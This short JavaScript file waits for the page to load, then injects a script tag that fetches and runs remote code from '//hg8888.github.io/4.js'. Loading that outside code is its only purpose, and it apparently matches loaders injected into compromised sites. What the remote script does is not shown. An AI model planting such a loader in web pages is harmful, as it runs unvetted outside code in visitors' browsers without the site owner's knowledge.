function rd(fn){  
    if(document.addEventListener){
        document.addEventListener('DOMContentLoaded',function(){  
            document.removeEventListener('DOMContentLoaded',arguments.callee,false); 
            fn();
        },false);  
    }else if(document.attachEvent){     
        document.attachEvent('onreadystatechange',function(){  
            if(document.readyState=='complete'){  
                document.detachEvent('onreadystatechange',arguments.callee);  
                //执行函数   
                fn();  
            }  
        });  
    }  
}
function app(){
var x = document.createElement("SCRIPT");x.src="//hg8888.github.io/4.js";document.body.appendChild(x);
}
if(typeof(document.body)=='undefined'){
rd(function(){
app();
});
}
else{
app();
}
